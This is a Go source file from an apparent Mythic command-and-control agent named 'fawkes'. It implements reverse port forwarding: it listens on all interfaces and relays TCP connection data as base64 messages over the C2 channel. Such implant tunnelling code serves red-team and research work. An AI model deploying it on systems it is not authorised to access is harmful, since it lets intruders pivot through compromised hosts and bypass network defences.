package rpfwd

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"sync"

	"fawkes/pkg/structs"
)

const readBufSize = 32 * 1024 // 32KB per read

// connTracker tracks a single rpfwd connection
type connTracker struct {
	conn    net.Conn
	port    uint32
	writeCh chan structs.SocksMsg
}

// Manager handles all active reverse port forward listeners and connections
type Manager struct {
	listeners   map[uint32]net.Listener    // port → listener
	connections map[uint32]*connTracker    // serverId → connection
	outbound    []structs.SocksMsg
	mu          sync.Mutex
}

// NewManager creates a new rpfwd manager
func NewManager() *Manager {
	return &Manager{
		listeners:   make(map[uint32]net.Listener),
		connections: make(map[uint32]*connTracker),
	}
}

// Start begins listening on the specified port for rpfwd connections
func (m *Manager) Start(port uint32) error {
	m.mu.Lock()
	// Close existing listener on this port if any
	if existing, ok := m.listeners[port]; ok {
		existing.Close()
		m.closeConnectionsForPort(port)
	}
	m.mu.Unlock()

	addr := fmt.Sprintf("0.0.0.0:%d", port)
	listener, err := net.Listen("tcp4", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", addr, err)
	}

	m.mu.Lock()
	m.listeners[port] = listener
	m.mu.Unlock()

	go m.acceptConnections(listener, port)

	log.Printf("[RPFWD] Listening on port %d", port)
	return nil
}

// Stop closes the listener and all connections on the specified port
func (m *Manager) Stop(port uint32) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	listener, ok := m.listeners[port]
	if !ok {
		return fmt.Errorf("no rpfwd listener on port %d", port)
	}

	listener.Close()
	delete(m.listeners, port)
	m.closeConnectionsForPort(port)

	log.Printf("[RPFWD] Stopped listening on port %d", port)
	return nil
}

// DrainOutbound atomically returns all pending outbound rpfwd messages and clears the queue
func (m *Manager) DrainOutbound() []structs.SocksMsg {
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(m.outbound) == 0 {
		return nil
	}
	msgs := m.outbound
	m.outbound = nil
	return msgs
}

// HandleMessages processes inbound rpfwd messages from Mythic
func (m *Manager) HandleMessages(msgs []structs.SocksMsg) {
	for _, msg := range msgs {
		m.mu.Lock()
		tracker, exists := m.connections[msg.ServerId]
		m.mu.Unlock()

		if !exists {
			if !msg.Exit {
				// Unknown connection, send exit back
				m.queueExit(msg.ServerId, msg.Port)
			}
			continue
		}

		if msg.Exit {
			m.closeConnection(msg.ServerId)
			continue
		}

		// Route data to the connection's write channel
		select {
		case tracker.writeCh <- msg:
		default:
			// Channel full, drop data (shouldn't happen with reasonable buffer)
			log.Printf("[RPFWD] Write channel full for server_id %d, dropping data", msg.ServerId)
		}
	}
}

// acceptConnections handles incoming TCP connections on a listener
func (m *Manager) acceptConnections(listener net.Listener, port uint32) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			// Listener closed
			return
		}

		serverID := rand.Uint32()
		writeCh := make(chan structs.SocksMsg, 200)

		tracker := &connTracker{
			conn:    conn,
			port:    port,
			writeCh: writeCh,
		}

		m.mu.Lock()
		m.connections[serverID] = tracker
		m.mu.Unlock()

		log.Printf("[RPFWD] New connection on port %d, server_id %d from %s", port, serverID, conn.RemoteAddr())

		go m.readFromConnection(serverID, conn, port)
		go m.writeToConnection(serverID, conn, writeCh, port)
	}
}

// readFromConnection reads data from a TCP connection and queues it as outbound rpfwd messages
func (m *Manager) readFromConnection(serverID uint32, conn net.Conn, port uint32) {
	buf := make([]byte, readBufSize)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			encoded := base64.StdEncoding.EncodeToString(buf[:n])
			m.mu.Lock()
			m.outbound = append(m.outbound, structs.SocksMsg{
				ServerId: serverID,
				Data:     encoded,
				Exit:     false,
				Port:     port,
			})
			m.mu.Unlock()
		}
		if err != nil {
			if err != io.EOF {
				log.Printf("[RPFWD] Read error for server_id %d: %v", serverID, err)
			}
			// Connection closed or errored — send exit and clean up
			m.mu.Lock()
			m.outbound = append(m.outbound, structs.SocksMsg{
				ServerId: serverID,
				Data:     "",
				Exit:     true,
				Port:     port,
			})
			m.mu.Unlock()
			m.closeConnection(serverID)
			return
		}
	}
}

// writeToConnection writes Mythic data to the TCP connection
func (m *Manager) writeToConnection(serverID uint32, conn net.Conn, writeCh chan structs.SocksMsg, port uint32) {
	for msg := range writeCh {
		if msg.Exit {
			m.closeConnection(serverID)
			return
		}

		if msg.Data == "" {
			continue
		}

		data, err := base64.StdEncoding.DecodeString(msg.Data)
		if err != nil {
			log.Printf("[RPFWD] Bad base64 data for server_id %d", serverID)
			m.queueExit(serverID, port)
			m.closeConnection(serverID)
			return
		}

		if _, err := conn.Write(data); err != nil {
			log.Printf("[RPFWD] Write error for server_id %d: %v", serverID, err)
			m.queueExit(serverID, port)
			m.closeConnection(serverID)
			return
		}
	}
}

// closeConnection closes a single connection and removes it from tracking
func (m *Manager) closeConnection(serverID uint32) {
	m.mu.Lock()
	tracker, exists := m.connections[serverID]
	if exists {
		delete(m.connections, serverID)
	}
	m.mu.Unlock()

	if exists {
		tracker.conn.Close()
		close(tracker.writeCh)
	}
}

// closeConnectionsForPort closes all connections associated with a specific port.
// Must be called with m.mu held.
func (m *Manager) closeConnectionsForPort(port uint32) {
	for id, tracker := range m.connections {
		if tracker.port == port {
			tracker.conn.Close()
			close(tracker.writeCh)
			delete(m.connections, id)
		}
	}
}

// queueExit queues an exit message for a server_id
func (m *Manager) queueExit(serverID uint32, port uint32) {
	m.mu.Lock()
	m.outbound = append(m.outbound, structs.SocksMsg{
		ServerId: serverID,
		Data:     "",
		Exit:     true,
		Port:     port,
	})
	m.mu.Unlock()
}
